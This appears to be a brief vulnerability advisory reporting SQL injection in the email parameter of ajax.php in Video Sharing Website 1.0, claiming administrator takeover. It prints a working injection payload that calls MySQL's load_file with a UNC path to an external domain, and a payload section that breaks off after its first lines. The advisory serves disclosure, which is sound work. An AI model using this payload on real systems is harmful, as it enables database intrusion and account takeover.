![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/Video-Sharing-Website/docs/vss_0.png)


## Description:
The `email` parameter from `ajax.php` app of Video Sharing Website 1.0 appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\dhy5y62urpxije56fiteqimmjdp6dy6mxplh87ww.nu11secur1ty.net\\pkq'))+' was submitted in the email parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can take administrator account controll on this system.
Status: CRITICAL

[+] Payload:

```mysql

Parameter: email (POST)
    Type: time-based blind
